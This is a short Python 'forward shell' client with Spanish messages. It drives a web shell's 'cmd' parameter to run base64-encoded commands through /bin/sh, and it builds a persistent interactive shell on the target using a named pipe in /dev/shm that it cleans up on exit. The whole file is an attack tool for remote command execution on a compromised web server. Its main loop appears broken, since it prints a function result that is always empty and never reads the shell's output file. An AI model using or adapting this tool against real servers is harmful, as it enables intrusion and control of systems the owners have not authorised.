#!/usr/bin/env python3

import requests
import signal
import sys

from termcolor import colored
from base64 import b64encode
from random import randrange

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo del programa...\n", "red"))
    remove_files()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "http://localhost/index.php"
session = randrange(1000, 9999)
stdin = f"/dev/shm/{session}.input"
stdout = f"/dev/shm/{session}.output"

def run_command(command: str) -> str:
    
    command = b64encode(command.encode()).decode()

    data = {
            'cmd': 'echo "%s" | base64 -d | /bin/sh' % command
    }

    try:
        r = requests.get(main_url, params=data, timeout=5)
        return r.text
    except:
        pass

    return None

def remove_files():
    run_command(f"/bin/rm -f {stdin}")
    run_command(f"/bin/rm -f {stdout}")

def set_command(command):

    command = b64encode(command.encode()).decode()

    data = {
        'cmd' : 'echo "%s" | base64 -d > %s' % (command, stdin) 
    }

    r = requests.get(main_url, params=data)

def set_setup():
    setup_command = f'mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s' % (stdin, stdin, stdout)
    run_command(setup_command)

if __name__ == "__main__":

    set_setup()

    while True:
        command = input(colored("> ", "yellow"))
        output = set_command(command)
        print(output)
